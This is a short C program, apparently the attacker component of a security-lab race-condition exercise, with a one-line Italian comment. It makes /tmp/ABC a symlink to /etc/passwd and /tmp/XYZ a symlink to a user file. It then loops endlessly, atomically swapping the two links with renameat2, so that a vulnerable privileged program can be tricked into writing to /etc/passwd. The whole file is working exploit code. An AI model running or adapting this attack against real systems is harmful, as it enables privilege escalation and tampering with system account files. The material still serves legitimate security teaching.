#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>



// creare i file /tmp/XYZ e /tmp/ABC con l'user seed, poi lanciare l'attacco

int main(){

    unsigned int flags = RENAME_EXCHANGE;

    unlink("/tmp/XYZ");
    symlink("/tmp/paperino", "/tmp/XYZ");
    
    unlink("/tmp/ABC");
    symlink("/etc/passwd", "/tmp/ABC");

    while(1){
        renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", flags);
    }
}
